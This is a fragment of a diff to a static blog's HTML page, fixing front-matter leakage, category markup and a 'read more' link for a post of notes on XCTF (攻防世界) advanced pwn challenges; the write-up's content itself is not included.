+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+    </span>
 
   
 </div>
@@ -1269,11 +550,10 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>title: 攻防世界pwn进阶<br>abbrlink: 5600bec<br>date: 2020-11-23 09:09:48<br>tags: 攻防世界<br>categories: pwn</p>
-<h1 id="攻防世界——pwn进阶"><a href="#攻防世界——pwn进阶" class="headerlink" title="攻防世界——pwn进阶"></a>攻防世界——pwn进阶</h1><p>攻防世界的pwn进阶题目的记录</p>
+          <h1 id="攻防世界——pwn进阶"><a href="#攻防世界——pwn进阶" class="headerlink" title="攻防世界——pwn进阶"></a>攻防世界——pwn进阶</h1><p>攻防世界的pwn进阶题目的记录</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/posts/0/#more" rel="contents">
+              <a class="btn" href="/posts/5600bec/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
